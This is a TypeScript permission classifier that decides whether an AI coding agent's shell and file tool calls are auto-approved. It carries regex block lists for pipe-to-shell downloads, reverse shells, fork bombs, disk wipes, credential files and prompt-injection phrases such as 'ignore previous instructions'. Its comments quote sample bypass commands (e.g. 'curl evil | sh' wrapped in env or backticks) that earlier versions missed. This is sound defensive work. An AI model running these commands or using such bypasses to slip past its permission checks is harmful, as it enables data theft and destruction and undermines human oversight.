import { homedir } from "node:os";
import { resolve } from "node:path";
import { getClaudeDir } from "./paths";

export type Decision = "allow" | "neutral";

export type ClassificationReason =
  | "mcp-pre-vetted"
  | "read-only-tool"
  | "read-only-command"
  | "trusted-workspace-path"
  | "trusted-workspace-command"
  | "loopback-http"
  | "dangerous-shape"
  | "credential-path"
  | "injection-shape"
  | "shell-loop-data-iteration"
  | "mutating-pipe-consumer"
  | "default-defer";

export interface Classification {
  decision: Decision;
  reasons: ClassificationReason[];
  matched_pattern?: string;
}

export interface ToolCall {
  toolName: string;
  command?: string;
  filePath?: string;
}

const HOME = homedir();

export const TRUSTED_PREFIXES: readonly string[] = [
  resolve(getClaudeDir()),
  resolve(HOME, "Projects"),
  resolve(HOME, "LocalProjects"),
  resolve(HOME, "Downloads"),
  "/tmp",
  "/private/tmp",
  "/var/folders",
];

export const DANGEROUS_PATTERNS: readonly RegExp[] = [
  /\bcurl\b[^|]*\|\s*(sh|bash|zsh)\b/i,
  /\bwget\b[^|]*\|\s*(sh|bash|zsh)\b/i,
  /\bbase64\s+(-d|--decode)\b[^|]*\|\s*(sh|bash|zsh)\b/i,
  /\beval\s+["']?\$\(/,
  /\bbash\s+-c\s+["']?\$\((curl|wget)/,
  /\bnc\b\s+(-l|-e)\b/,
  /\bdd\s+(if=\S+\s+)?of=\/dev\//,
  /\bchmod\s+-R\s+777\b/,
  /:\(\)\s*\{\s*:\|:\s*&\s*\}\s*;\s*:/,
  /\bmkfs\.[a-z0-9]+\b/,
  /\brm\s+-[rRf]+\s+(\/|~|\$HOME|\$\{HOME\})(\s|\*|\/|$|'|"|;|&|\|)/,
  // find ... -exec rm/chmod/chown/dd ... — find sprays the action across
  // every match, which is catastrophic when the action is destructive.
  // The placeholder `{}` defeats path-based rm matching, so we match the
  // -exec body directly here regardless of what `{}` resolves to.
  /\bfind\b[^|]*\s-exec(?:dir)?\s+(rm\s+-[rRf]|chmod\s+-R\s+777|chown\s+-R|dd\s+|mkfs\.|sh\s+-c|bash\s+-c)/,
  // Dev-binary-wrapped escape hatches — close the gap opened by DEV_BINARIES allow.
  // No quote-class constraint: real injection uses nested/escaped quotes, so
  // just look for "lang -X" followed somewhere by a dangerous token.
  /\bpython3?\s+-c\b[^|]*\b(exec|eval|__import__|subprocess|os\.system|os\.popen|compile)\b/,
  /\bnode\s+-e\b[^|]*\b(require\s*\(|process\.|child_process|spawn|exec)\b/,
  /\bruby\s+-e\b[^|]*\b(eval|system|exec|IO\.popen|backtick)\b/,
  /\bperl\s+-e\b[^|]*\b(system|exec|qx)\b/,
  /\bphp\s+-r\b[^|]*\b(system|exec|shell_exec|passthru|popen)\b/,
  // docker host-mount + run-as-root patterns
  /\bdocker\s+run\b[^|]*\s(-v|--volume)[= ]\s*\/(\s|:)/,
  /\bdocker\s+run\b[^|]*\s(-v|--volume)[= ]\s*\$HOME(:|\s)/,
  /\bdocker\s+run\b[^|]*--privileged/,
  // git push --force / hard reset on protected branches
  /\bgit\s+push\b.*--force.*\b(main|master|production|prod)\b/,
  /\bgit\s+reset\s+--hard\s+\S*(main|master|production|prod)/,
];

export const INJECTION_SHAPES: readonly RegExp[] = [
  /ignore\s+(all\s+)?previous\s+instructions/i,
  /you\s+are\s+now\s+(in\s+)?(developer|admin|root|god)\s+mode/i,
  /<\/?system>/i,
  /BEGIN_INSTRUCTION|END_INSTRUCTION/,
  /system_prompt\s*=\s*["']/i,
  /\bjailbreak\b/i,
  /\bDAN\s+mode\b/i,
];

export const CREDENTIAL_PATHS: readonly RegExp[] = [
  /\.ssh\/(id_[a-z0-9]+|[a-z0-9_-]+_rsa|[a-z0-9_-]+_ed25519)\b/,
  /\.aws\/credentials\b/,
  /\.gnupg\/(private-keys|secring)/,
  /(^|\s|=|@|"|')([~\$\{\}\/A-Za-z0-9._-]+\/)?\.env(\.[a-zA-Z0-9_-]+)?(\s|$|"|')/,
];

export const READ_ONLY_COMMAND_PATTERNS: readonly RegExp[] = [
  /^(ls|cat|head|tail|wc|file|stat|du|df|which|type|echo|printf)\b/,
  /^git\s+(?:-[A-Za-z]+\s+\S+\s+)?(status|log|diff|show|branch|tag|remote|rev-parse|ls-files|ls-tree|blame|describe|reflog|fetch)\b/,
  /^(rg|grep|fd|find|bat|eza|tree|jq|yq)\b/,
  /^bun\s+(?:run\s+)?(test|check|lint|type-check|build|--version)\b/,
  /^(node|deno)\s+.*--version\b/,
  /^(date|pwd|whoami|uname|hostname|id|env)\b/,
];

export const SEARCH_TOOLS: readonly string[] = [
  "grep",
  "rg",
  "ag",
  "find",
  "fd",
  "cat",
  "bat",
  "less",
  "more",
  "head",
  "tail",
  "wc",
  "jq",
  "yq",
  "tree",
  "eza",
  "ls",
  "file",
  "stat",
];

// Dev-workflow binaries: auto-allow when first word matches AND no
// dangerous/credential/injection pattern fires. These are the tools {{PRINCIPAL_NAME}}
// runs constantly inside trusted workspaces — package managers, test
// runners, language toolchains, cloud CLIs, build systems. Treating them
// as prompt-worthy creates daily friction without adding safety, because
// the catastrophic shapes (curl|sh, rm -rf /, exfil, fork bomb) are
// already gated by DANGEROUS_PATTERNS upstream.
export const DEV_BINARIES: readonly string[] = [
  // package managers
  "npm", "pnpm", "yarn", "bunx", "npx", "pip", "pip3", "uv", "poetry",
  "gem", "bundle", "composer", "cargo", "go", "mvn", "gradle", "mix",
  "brew", "port",
  // test runners
  "pytest", "jest", "vitest", "mocha", "tap", "rspec", "phpunit",
  "playwright", "cypress",
  // language toolchains
  "python", "python3", "ruby", "perl", "php", "elixir", "lein",
  "clojure", "stack", "ghc", "cabal", "raco", "scheme", "rustc",
  // build / lint / type-check
  "make", "cmake", "ninja", "tsc", "eslint", "prettier", "biome",
  "ruff", "black", "mypy", "rubocop", "clippy", "swiftlint", "swiftformat",
  // cloud / infra CLIs
  "docker", "podman", "kubectl", "helm", "aws", "gcloud", "az",
  "terraform", "pulumi", "vercel", "fly", "railway", "heroku",
  // {{PRINCIPAL_NAME}}-specific tools
  "interceptor", "fabric", "hyperfine", "watchexec",
  // language runtimes for direct invocations (`node x.js`, `deno run x.ts`,
  // `bun x.ts`) — the read-only pattern only covered `--version` checks
  "node", "deno", "bun",
];

export const READ_ONLY_TOOLS: readonly string[] = ["Read", "Glob", "Grep"];

function escapeRegex(value: string): string {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function trustedCommandForms(): readonly string[] {
  const forms: string[] = [];
  for (const prefix of TRUSTED_PREFIXES) {
    forms.push(prefix);
    if (prefix.startsWith(HOME + "/")) {
      const suffix = prefix.slice(HOME.length);
      forms.push("~" + suffix, "$HOME" + suffix, "${HOME}" + suffix);
    }
  }
  return forms;
}

const TRUSTED_COMMAND_TARGET_PATTERN = new RegExp(
  `(?:${trustedCommandForms().map(escapeRegex).join("|")})(?=$|[\\/\\s"'\\\`;|&)$])`,
);

export function isTrustedPath(filePath: string): boolean {
  let p = filePath;
  if (p.startsWith("~")) p = HOME + p.slice(1);
  p = p.replace(/\$\{?HOME\}?/g, HOME);
  const resolved = resolve(p);
  return TRUSTED_PREFIXES.some(
    (prefix) => resolved === prefix || resolved.startsWith(prefix + "/"),
  );
}

export function bashTargetsTrustedPath(command: string): boolean {
  return TRUSTED_COMMAND_TARGET_PATTERN.test(command);
}

/**
 * Remove all single-quoted segments from a bash command string.
 *
 * Bash single-quoted strings are LITERAL: no escapes, no parameter
 * expansion, no command substitution. The contents of `'...'` cannot
 * execute through the outer shell. Therefore, when the classifier is
 * pattern-matching for dangerous SHAPES that the outer shell would
 * execute, single-quoted regions are pure data and should be ignored
 * by those matchers.
 *
 * Replaces each `'...'` segment with the empty quote pair `''` so the
 * surrounding tokens still tokenize correctly (e.g. `a 'x' b` becomes
 * `a '' b`, preserving word boundaries that downstream regex relies on).
 *
 * IMPORTANT: this is shape sanitization for matchers, NOT shell parsing.
 * It is intentionally simple. Callers MUST gate use behind
 * `executesSingleQuotedArg(cmd)` so wrappers like `bash -c '…'`,
 * `eval '…'`, and language interpreters with `-c`/`-e`/`-r` flags
 * (which execute their single-quoted argument) are NOT stripped.
 */
export function stripSingleQuoted(cmd: string): string {
  return cmd.replace(/'[^']*'/g, "''");
}

/**
 * Extract the contents of every `'…'` segment in the command, returned
 * as an array of inner strings (without the surrounding quotes). Used
 * by the classifier when the outer command is a wrapper that executes
 * its single-quoted arg (`bash -c '…'`, `eval '…'`, `python -c '…'`):
 * pattern matchers run against the extracted inner content directly so
 * that shapes whose dangerous-pattern anchors require trailing-context
 * (e.g. `rm -rf /` followed by space/end) match cleanly against the
 * inner program rather than against `…/'` in the wrapper form.
 */
export function extractSingleQuotedArgs(cmd: string): string[] {
  const matches = cmd.match(/'[^']*'/g);
  if (!matches) return [];
  return matches.map((m) => m.slice(1, -1));
}

/**
 * True when the outer command's structure indicates the single-quoted
 * argument(s) will be EXECUTED rather than passed as inert data.
 *
 * Matches:
 *   - `bash -c '…'`, `sh -c '…'`, `zsh -c '…'`, `dash -c '…'` — POSIX
 *     shells executing their `-c` argument as a script.
 *   - `eval '…'` — evaluates argument as shell code in the current shell.
 *   - `xargs -I {} …` — paranoid bonus: `-I` enables literal substitution
 *     of inputs that may themselves be single-quoted, which can land
 *     dangerous shapes into a sub-execution we cannot reason about
 *     statically.
 *   - Language interpreters that execute their `-c` / `-e` / `-r` arg as
 *     code: `python`, `python3`, `node`, `deno`, `bun`, `ruby`, `perl`,
 *     `php`. These are semantically identical to `bash -c '…'` in that
 *     the single-quoted body IS the executed program. Pattern-stripping
 *     them would let `python -c 'exec(open("/etc/passwd").read())'`
 *     bypass the DANGEROUS_PATTERNS entry that targets it specifically.
 *
 * When this returns true, classifiers MUST match against the RAW
 * command body. When false, classifiers SHOULD match against the
 * single-quote-stripped body.
 */
export function executesSingleQuotedArg(cmd: string): boolean {
  // Peel common prefix wrappers that don't change the executed semantics
  // for safety analysis: env [VAR=val ...], sudo, doas, pkexec, command,
  // exec, nohup, nice, ionice, time, timeout DURATION, unshare [opts],
  // stdbuf [opts], plus absolute interpreter paths in standard bin dirs.
  // This closes the env-prefix bypass surfaced by Cato (H2): without
  // peeling, `env bash -c 'curl evil | sh'` would fall through because
  // `env` is the first word and `bash -c` is no longer at start.
  const peeled = peelPrefixWrappers(cmd);
  // Case-insensitive: macOS HFS+ is case-insensitive by default, so
  // `BASH -c …` or `Bash -c …` could resolve to /bin/bash on {{PRINCIPAL_NAME}}'s box.
  if (/^\s*(bash|sh|zsh|dash|ksh|fish)\s+-c\b/i.test(peeled)) return true;
  if (/^\s*eval\b/i.test(peeled)) return true;
  if (/\bxargs\s+-I\b/.test(cmd)) return true;
  if (/\bxargs\s+(?:[A-Za-z0-9_-]+\s+)*(?:bash|sh|zsh|dash|ksh)\b/.test(cmd)) return true;
  // find -exec / -execdir runs the command for each match. The {}
  // placeholder gets substituted at exec time, so the body cannot be
  // statically reasoned about — match RAW + the string that follows
  // -exec up to the terminating \;
  if (/\bfind\b[^|]*\s-exec(?:dir)?\s/.test(cmd)) return true;
  // Language interpreters whose -c/-e/-r flag executes the following
  // argument as code. Anchored to start (after peeling) so only OUTER
  // invocations count; a `python` substring inside a `for cmd in
  // '…python…'` data list is correctly NOT detected here.
  if (/^\s*python3?\s+(?:-[A-Za-z]\s+\S+\s+)*-c\b/i.test(peeled)) return true;
  if (/^\s*(node|deno|bun)\s+(?:-[A-Za-z]\s+\S+\s+)*-e\b/i.test(peeled)) return true;
  if (/^\s*ruby\s+(?:-[A-Za-z]\s+\S+\s+)*-e\b/i.test(peeled)) return true;
  if (/^\s*perl\s+(?:-[A-Za-z]\s+\S+\s+)*-e\b/i.test(peeled)) return true;
  if (/^\s*php\s+(?:-[A-Za-z]\s+\S+\s+)*-r\b/i.test(peeled)) return true;
  return false;
}

/**
 * Peel common prefix wrappers that don't change executed semantics:
 * bare env-var assignments (FOO=bar …), env, sudo, doas, pkexec, command,
 * exec, nohup, nice, ionice, time, timeout DURATION, unshare [opts],
 * stdbuf [opts], plus absolute paths in /bin, /usr/bin, /usr/local/bin,
 * /opt/homebrew/bin.
 *
 * The bare-assignment peel mirrors Claude Code 2.1.145's fix for the
 * `FOO=bar somecmd` auto-approve bypass: without it, a leading assignment
 * keeps `bash -c '…'` off the start of the string, so executesSingleQuotedArg
 * stays false, the single-quoted body gets blanked instead of scanned, and a
 * genuinely dangerous `FOO=bar bash -c 'curl evil | sh'` loses its
 * dangerous-shape match. Peeling restores wrapper detection.
 *
 * Up to 3 nesting layers (e.g. `sudo nohup nice bash -c …`).
 */
export function peelPrefixWrappers(cmd: string): string {
  let prev = cmd;
  let next = cmd;
  for (let i = 0; i < 3; i++) {
    next = prev
      .replace(/^\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)+/, "")
      .replace(/^\s*sudo(?:\s+-[A-Za-z]\S*)*\s+/i, "")
      .replace(/^\s*(?:doas|pkexec)(?:\s+-[A-Za-z]\S*)*\s+/i, "")
      .replace(/^\s*env(?:\s+-[A-Za-z]\S*)*(?:\s+[A-Za-z_][A-Za-z0-9_]*=\S*)*\s+/i, "")
      .replace(/^\s*(?:command|exec|nohup|nice|ionice)\s+/i, "")
      .replace(/^\s*time\s+/i, "")
      .replace(/^\s*timeout\s+\S+\s+/i, "")
      .replace(/^\s*(?:unshare|stdbuf)(?:\s+-[A-Za-z]\S*)*\s+/i, "")
      .replace(/^(\s*)\/(?:bin|usr\/bin|usr\/local\/bin|opt\/homebrew\/bin|sbin|usr\/sbin)\/([A-Za-z0-9_\-.]+)/, "$1$2");
    if (next === prev) break;
    prev = next;
  }
  return next;
}

/**
 * Extract command-substitution and process-substitution inner content
 * from a command string: backticks `…`, `$(…)`, `<(…)`, `>(…)`.
 *
 * Returns a flat list of inner strings — one per substitution found.
 * Used to feed shapeTargets so DANGEROUS_PATTERNS / CREDENTIAL_PATHS /
 * INJECTION_SHAPES see the executed inner content. Without this, an
 * outer command with a read-only first word (`echo`, `printf`, `cat`,
 * `find`) but a dangerous backtick/$() body would auto-allow because
 * the first-word allow path runs before any deep pattern scan.
 *
 * Caller is expected to first call this on either the RAW cmd (for
 * wrapper outer) or the single-quote-stripped cmd (for non-wrapper
 * outer) so that command-subs inside literal single-quoted data
 * regions are NOT extracted (they aren't executed).
 *
 * Nesting: the regex is non-recursive — handles one level of `$(…)`
 * and `<(…)`. Pathological nested cases fall back to default-defer at
 * the end of the classifier, which prompts the user. Acceptable.
 */
export function extractCommandSubstitutions(cmd: string): string[] {
  const out: string[] = [];
  for (const m of cmd.matchAll(/`([^`]*)`/g)) {
    if (m[1]) out.push(m[1]);
  }
  for (const m of cmd.matchAll(/\$\(([^()]*)\)/g)) {
    if (m[1]) out.push(m[1]);
  }
  for (const m of cmd.matchAll(/[<>]\(([^()]*)\)/g)) {
    if (m[1]) out.push(m[1]);
  }
  return out;
}

/**
 * Pipe/chain into a mutating consumer (#732). A read-only FIRST WORD
 * (find, echo, ls, cat, …) must not auto-allow a command whose LATER
 * segments mutate the filesystem:
 *
 *   find / | xargs -I% rm -f %          — destructive body behind xargs
 *   find . -type f | xargs chmod 777    — same, no -I
 *   echo 'rm -rf /' > s.sh && chmod +x s.sh && ./s.sh — write-then-execute chain
 *
 * The first-word allow paths (SEARCH_TOOLS / DEV_BINARIES /
 * READ_ONLY_COMMAND_PATTERNS / trusted-workspace) only look at the head
 * of the command, so these shapes previously returned `allow` before any
 * destructive scan ran. Detection here returns `neutral` (defer to the
 * native permission prompt) — never a hard block — so legitimate bulk
 * operations just prompt.
 *
 * Matched against the quote-stripped form (single-quoted data regions are
 * inert for non-wrapper commands), so `echo 'use chmod carefully'` does
 * NOT trip this.
 */
const MUTATING_CONSUMER = "(?:rm|unlink|chmod|chown|mv|dd)";
export const MUTATING_PIPE_PATTERNS: readonly RegExp[] = [
  // pipe into xargs whose body carries a destructive command (with or without -I)
  new RegExp(`\\|\\s*(?:\\S*\\/)?xargs\\b[^|]*\\b${MUTATING_CONSUMER}\\b`),
  // pipe into xargs -I — literal substitution; body cannot be reasoned about statically
  /\|\s*(?:\S*\/)?xargs\s+(?:-\S+\s+)*-I/,
  // direct pipe into a destructive binary (e.g. `… | dd of=…`)
  new RegExp(`\\|\\s*(?:sudo\\s+)?${MUTATING_CONSUMER}\\b`),
  // chained destructive command after && or ; behind a read-only first word
  // (write-then-execute: `echo '…' > s.sh && chmod +x s.sh && ./s.sh`).
  // `mv` is deliberately excluded from the CHAIN form (common in benign
  // build chains); it stays covered in the pipe/xargs forms above.
  new RegExp(`(?:&&|;)\\s*(?:sudo\\s+)?(?:rm|unlink|chmod|chown|dd)\\b`),
];

export function pipesToMutatingConsumer(target: string): RegExp | null {
  for (const r of MUTATING_PIPE_PATTERNS) {
    if (r.test(target)) return r;
  }
  return null;
}

export function classifyCommand(tc: ToolCall): Classification {
  if (tc.toolName.startsWith("mcp__")) {
    return { decision: "allow", reasons: ["mcp-pre-vetted"] };
  }

  if (READ_ONLY_TOOLS.includes(tc.toolName)) {
    return { decision: "allow", reasons: ["read-only-tool"] };
  }

  if (tc.command) {
    const cmd = tc.command;
    const firstWord = (cmd.trim().split(/\s+/)[0] || "").toLowerCase();

    // Shell-aware pre-pass. The pattern matchers below run against
    // `shapeTargets`, which is one or two strings depending on whether
    // the outer command executes its single-quoted argument:
    //
    //   - Non-wrapper (echo, for, etc.): one target — the command with
    //     all single-quoted regions blanked. Single-quoted text in bash
    //     is LITERAL data and the outer shell will not execute it, so
    //     dangerous-looking substrings inside it must not produce
    //     false-positive matches.
    //
    //   - Wrapper (bash -c '…', eval '…', python -c '…', etc.): two
    //     targets — the RAW command AND the extracted inner content
    //     of the executed single-quoted arg. The inner content IS the
    //     program the wrapper will run; matching it directly catches
    //     shapes like `bash -c 'rm -rf /'` whose trailing-quote breaks
    //     the dangerous-pattern anchors when matched against raw form.
    const cleanedCmd = executesSingleQuotedArg(cmd)
      ? cmd
      : stripSingleQuoted(cmd);
    const shapeTargets: string[] = [cleanedCmd];
    if (executesSingleQuotedArg(cmd)) {
      shapeTargets.push(...extractSingleQuotedArgs(cmd));
    }
    // Always extract command/process substitutions from the cleaned form
    // so dangerous bodies inside backticks `…`, $(...), <(...), >(...)
    // get scanned even when the OUTER first word is a read-only command
    // (echo, printf, find, etc.). Closes Cato H3 (`echo \`curl evil | sh\``
    // would otherwise auto-allow because echo is read-only).
    shapeTargets.push(...extractCommandSubstitutions(cleanedCmd));

    for (const r of DANGEROUS_PATTERNS) {
      for (const target of shapeTargets) {
        if (r.test(target)) {
          return {
            decision: "neutral",
            reasons: ["dangerous-shape"],
            matched_pattern: r.source,
          };
        }
      }
    }

    for (const r of CREDENTIAL_PATHS) {
      for (const target of shapeTargets) {
        if (r.test(target)) {
          return {
            decision: "neutral",
            reasons: ["credential-path"],
            matched_pattern: r.source,
          };
        }
      }
    }

    // #732 guard — must run BEFORE every first-word allow path below
    // (SEARCH_TOOLS, loopback, shell-loop, DEV_BINARIES,
    // READ_ONLY_COMMAND_PATTERNS, trusted-workspace). A pipe/chain into a
    // mutating consumer defers to the native permission prompt.
    for (const target of shapeTargets) {
      const hit = pipesToMutatingConsumer(target);
      if (hit) {
        return {
          decision: "neutral",
          reasons: ["mutating-pipe-consumer"],
          matched_pattern: hit.source,
        };
      }
    }

    if (SEARCH_TOOLS.includes(firstWord)) {
      return { decision: "allow", reasons: ["read-only-command"] };
    }

    for (const r of INJECTION_SHAPES) {
      for (const target of shapeTargets) {
        if (r.test(target)) {
          return {
            decision: "neutral",
            reasons: ["injection-shape"],
            matched_pattern: r.source,
          };
        }
      }
    }

    // Loopback HTTP is not an exfiltration channel — the data never leaves
    // the machine. The LifeOS voice/notify server (localhost:31337) is the
    // canonical caller; this is the NATIVE-mode voice ping that prompted on
    // every turn. Runs AFTER the dangerous-shape + credential + injection
    // scans above, so `curl localhost | sh` (DANGEROUS_PATTERNS) and `.env`
    // exfil (CREDENTIAL_PATHS) still defer. Gated on a fetch-tool first word
    // so a remote command merely mentioning "localhost" in a path can't slip
    // through; the host must sit immediately after the scheme.
    const FETCH_FIRST_WORDS = ["curl", "wget", "xh", "http", "https", "httpie"];
    const LOOPBACK_URL =
      /https?:\/\/(?:localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])(?::\d+)?(?:[\/\s"']|$)/i;
    if (FETCH_FIRST_WORDS.includes(firstWord) && LOOPBACK_URL.test(cmd)) {
      return { decision: "allow", reasons: ["loopback-http"] };
    }

    // Shell control-flow first word (for/while/until). The
    // dangerous/credential/injection matchers above already ran against
    // shapeTargets and stayed silent, so the body's surface tokens are
    // not on the catastrophic-shape list. Allow ONLY when the cleaned
    // body also has no shell-execution sub-shapes that would re-exec
    // the iterated data through a sub-shell.
    if (/^\s*(for|while|until)\s/.test(cmd)) {
      const SHELL_EXEC_SHAPES: readonly RegExp[] = [
        /\b(bash|sh|zsh|dash|ksh|fish)\s+-c\b/,
        /\b(python3?|node|deno|bun|ruby|perl)\s+-[ec]\b/,
        /\bphp\s+-r\b/,
        /\beval\b/,
        /\bxargs\s+-I\b/,
        /\|\s*(sh|bash|zsh|dash|ksh)\b/,
        /\$\(/,
        /`[^`]*`/,
        /<\(|>\(/,
        /\b(source|\.)\s+<\(/,
        /<<<\s*['"]/,
      ];
      // Use the stripped form (single-quoted regions blanked) so dangerous
      // shapes that exist only inside iterated data strings do NOT cause
      // the loop to be rejected. The matchers above already cleared shape
      // safety; this only rejects shapes in the EXECUTING body.
      const cleaned = stripSingleQuoted(cmd);
      const cleanedHasExec = SHELL_EXEC_SHAPES.some((r) => r.test(cleaned));
      if (!cleanedHasExec) {
        return { decision: "allow", reasons: ["shell-loop-data-iteration"] };
      }
      // Has exec shape in the executing body — fall through to default-defer.
    }

    if (DEV_BINARIES.includes(firstWord)) {
      return { decision: "allow", reasons: ["read-only-command"] };
    }

    for (const r of READ_ONLY_COMMAND_PATTERNS) {
      if (r.test(cmd)) {
        return { decision: "allow", reasons: ["read-only-command"] };
      }
    }

    if (bashTargetsTrustedPath(cmd)) {
      return { decision: "allow", reasons: ["trusted-workspace-command"] };
    }
  }

  if (tc.filePath && isTrustedPath(tc.filePath)) {
    return { decision: "allow", reasons: ["trusted-workspace-path"] };
  }

  return { decision: "neutral", reasons: ["default-defer"] };
}
